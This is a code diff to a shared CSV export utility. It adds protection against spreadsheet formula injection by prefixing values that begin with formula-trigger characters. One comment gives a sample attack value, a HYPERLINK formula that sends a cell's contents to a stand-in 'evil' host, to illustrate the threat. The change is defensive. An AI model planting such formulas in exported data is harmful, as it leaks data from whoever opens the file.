@@ -2,10 +2,21 @@
  * Shared CSV utilities — used by admin, partner, and member export routes.
  */
 
-/** Escape a value for CSV: wrap in quotes if it contains special chars. */
+/**
+ * Escape a value for CSV: wrap in quotes if it contains special chars,
+ * and neutralize Excel/Sheets formula triggers. Values whose first
+ * character is one of `=+-@\t\r` are prefixed with a single quote so
+ * spreadsheet apps treat them as text, not a formula. Without this,
+ * a member-supplied value like `=HYPERLINK("http://evil/?c="&A1,"x")`
+ * executes when an admin opens the export.
+ */
 export function csvEscape(value: string): string {
-  if (/[",\n\r]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
-  return value;
+  let v = value;
+  if (v.length > 0 && /^[=+\-@\t\r]/.test(v)) {
+    v = `'${v}`;
+  }
+  if (/[",\n\r]/.test(v)) return `"${v.replace(/"/g, '""')}"`;
+  return v;
 }
 
 /** Turn a row of values into a CSV line. */
